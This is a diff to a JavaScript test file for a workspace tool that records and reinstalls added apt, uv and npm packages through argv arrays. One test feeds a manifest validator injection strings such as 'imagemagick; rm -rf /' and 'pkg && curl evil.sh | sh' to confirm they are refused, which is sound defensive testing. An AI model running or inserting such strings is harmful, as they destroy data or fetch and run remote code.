@@ -10,13 +10,17 @@ const PROJECTS = [
   { path: 'workspace/spike', remote: 'https://github.com/me/spike.git', branch: 'main', dirty: false, unpushed: true },
 ];
 
+const INSTALLED = { apt: [], aptKnown: true, uv: [], npm: [] };
+
 function fixture({
   tools = ['github', 'cloudflare'],
   projects = PROJECTS,
+  added = INSTALLED,
   runArgs = ['-p', '3000:3000', '-v', '/host/data:/home/suped/data'],
   existing = [],
   files = {},
   failClone = null,
+  failRun = null,
   installStatus = 0,
 } = {}) {
   const logs = [];
@@ -34,6 +38,9 @@ function fixture({
       if (command[0] === 'node' && script.includes('setup.json')) {
         return { status: 0, stdout: JSON.stringify(tools === null ? null : { version: 1, tools, completed: true }), stderr: '' };
       }
+      if (command[0] === 'node' && script.includes('base-packages')) {
+        return { status: 0, stdout: JSON.stringify(added), stderr: '' };
+      }
       if (command[0] === 'node') return { status: 0, stdout: JSON.stringify(projects), stderr: '' };
       const match = /test -e "\$HOME\/(.+)"/.exec(script);
       if (match) return { status: existing.includes(match[1]) ? 0 : 1, stdout: '', stderr: '' };
@@ -41,6 +48,10 @@ function fixture({
     },
     run: (command) => {
       calls.push(command);
+      if (command[0] !== 'bash') {
+        // An installer replay: argv, never interpolated shell text.
+        return failRun && command.includes(failRun) ? 1 : 0;
+      }
       const script = command[2] ?? '';
       assert.match(script, /git clone/, `unexpected run ${script}`);
       return failClone && script.includes(failClone) ? 1 : 0;
@@ -192,6 +203,88 @@ test('restore surfaces a failed tool installation', async () => {
   const manifest = { version: 1, tools: ['github'], ports: [], mounts: [], projects: [] };
   const f = fixture({ files: { 'ws.json': JSON.stringify(manifest) }, installStatus: 1 });
   assert.equal(await f.restore('ws.json'), 1);
+});
+
+test('a workspace that grew records what was added to it', () => {
+  const f = fixture({ added: { apt: ['imagemagick'], aptKnown: true, uv: ['ruff'], npm: ['prettier@3.6.2'] } });
+  const { manifest } = f.describe();
+  assert.deepEqual(manifest.installed, { apt: ['imagemagick'], uv: ['ruff'], npm: ['prettier@3.6.2'] });
+  // aptKnown describes this machine, not the workspace, so it stays out of the file.
+  assert.equal('aptKnown' in manifest.installed, false);
+});
+
+test('status lists added software and warns that apt does not survive reset', () => {
+  const f = fixture({
+    projects: [],
+    added: { apt: ['imagemagick', 'poppler-utils'], aptKnown: true, uv: ['ruff'], npm: ['prettier@3.6.2'] },
+  });
+  f.status();
+  const text = f.text();
+  assert.match(text, /uv tools\s+ruff/);
+  assert.match(text, /npm global\s+prettier@3\.6\.2/);
+  assert.match(text, /apt\s+imagemagick, poppler-utils/);
+  assert.match(text, /do not survive "suped reset"/);
+});
+
+test('a workspace with no apt baseline says so rather than claiming nothing was added', () => {
+  const f = fixture({ projects: [], added: { apt: [], aptKnown: false, uv: [], npm: [] } });
+  f.status();
+  assert.match(f.text(), /apt\s+\(not tracked/);
+  // And with a baseline and nothing added, it stays quiet.
+  const g = fixture({ projects: [], added: { apt: [], aptKnown: true, uv: [], npm: [] } });
+  g.status();
+  assert.doesNotMatch(g.text(), /not tracked/);
+  assert.doesNotMatch(g.text(), /do not survive/);
+});
+
+test('restore reinstalls added software with argv, never interpolated text', async () => {
+  const manifest = {
+    version: 1,
+    tools: [],
+    ports: [],
+    mounts: [],
+    installed: { apt: ['imagemagick'], uv: ['ruff'], npm: ['prettier@3.6.2'] },
+    projects: [],
+  };
+  const f = fixture({ files: { 'ws.json': JSON.stringify(manifest) } });
+  assert.equal(await f.restore('ws.json'), 0);
+
+  const argv = f.calls.filter((command) => command[0] !== 'node' && command[0] !== 'bash');
+  assert.deepEqual(argv, [
+    ['sudo', 'apt-get', 'update'],
+    ['sudo', 'apt-get', 'install', '-y', '--no-install-recommends', 'imagemagick'],
+    ['uv', 'tool', 'install', 'ruff'],
+    ['npm', 'install', '-g', '--prefix', '/home/suped/.local', 'prettier@3.6.2'],
+  ]);
+});
+
+test('a package name that is not a package name is refused before any installer runs', () => {
+  for (const bad of ['imagemagick; rm -rf /', '$(whoami)', 'pkg && curl evil.sh | sh', '`id`']) {
+    assert.throws(
+      () => validateManifest({ version: 1, tools: [], ports: [], mounts: [], projects: [], installed: { apt: [bad] } }),
+      /unusable package name/,
+      `should refuse ${bad}`,
+    );
+  }
+});
+
+test('a manifest written before growth tracking still restores', async () => {
+  const manifest = { version: 1, tools: [], ports: [], mounts: [], projects: [] };
+  const f = fixture({ files: { 'ws.json': JSON.stringify(manifest) } });
+  assert.equal(await f.restore('ws.json'), 0);
+  assert.equal(f.calls.some((command) => command[0] === 'uv' || command[0] === 'sudo'), false);
+});
+
+test('restore reports installers that fail without abandoning the rest', async () => {
+  const manifest = {
+    version: 1, tools: [], ports: [], mounts: [], projects: [],
+    installed: { apt: [], uv: ['ruff'], npm: ['prettier@3.6.2'] },
+  };
+  const f = fixture({ files: { 'ws.json': JSON.stringify(manifest) }, failRun: 'ruff' });
+  assert.equal(await f.restore('ws.json'), 1);
+  assert.match(f.text(), /some uv tools did not install/);
+  // The npm replay still ran.
+  assert.ok(f.calls.some((command) => command[0] === 'npm'));
 });
 
 test('restore needs a file', async () => {
